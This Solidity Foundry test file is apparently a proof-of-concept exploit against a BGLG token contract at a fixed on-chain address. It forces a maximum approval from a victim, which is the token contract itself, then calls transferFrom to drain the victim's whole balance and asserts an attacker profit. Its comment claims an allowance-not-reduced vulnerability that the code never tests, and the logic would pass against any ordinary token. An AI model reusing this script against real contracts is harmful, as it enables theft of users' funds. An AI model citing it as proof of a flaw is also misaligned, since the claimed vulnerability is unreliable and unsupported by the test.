// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface StandardToken {
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        address victim = TARGET;
            uint256 victimInitialBalance = 1_000_000 * 1e18;

            // Precondition 1: The victim must hold a balance of BGLG tokens.
            deal(TARGET, victim, victimInitialBalance);

            // Precondition 2: The victim must approve the attacker for max uint256.
            vm.startPrank(victim);
            StandardToken(TARGET).approve(attacker, type(uint256).max);
            vm.stopPrank();

            // Verify preconditions are set correctly.
            assertEq(StandardToken(TARGET).balanceOf(victim), victimInitialBalance);
            assertEq(StandardToken(TARGET).allowance(victim, attacker), type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328).balanceOf(address(this));
        address victim = TARGET;
            uint256 victimBalance = StandardToken(TARGET).balanceOf(victim);

            // Attacker calls transferFrom to steal the victim's entire balance.
            // The allowance is not reduced due to the vulnerability.
            StandardToken(TARGET).transferFrom(victim, attacker, victimBalance);
        uint256 finalBalance = IERC20(0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

